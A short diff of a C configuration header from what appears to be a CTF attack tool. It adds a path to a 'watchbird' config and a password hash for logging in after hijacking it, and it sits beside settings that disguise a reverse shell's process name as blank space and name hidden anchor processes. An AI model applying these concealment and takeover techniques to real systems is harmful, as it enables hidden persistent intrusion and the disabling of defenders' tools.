@@ -49,6 +49,8 @@
 #define WWWROOT "/var/www/html/"                            // end of /
 #define FLAG_DIR WWWROOT ".xia0ji233/"                      //加密flag存放目录（web不能对外连接时使用）
 #define FLAG_FILE FLAG_DIR "flag"                            //加密flag文件路径
+#define WB_CONF_PATH "/tmp/watchbird/watchbird.conf"         //watchbird配置文件路径
+#define WB_PASSWORD_SHA1 "0ef37cd2cc54e7a0e2eb998923e594e09d3bd832" //劫持watchbird后的登录密码SHA1（默认: xia0ji233）
 #define SHELL_NAME "                               "        //反弹shell的进程名
 /* D状态锚点进程的 prctl 短名（≤15字节），显示在 ps 的 comm 列 */
 #define ANCHOR_COMM_NAMES { \
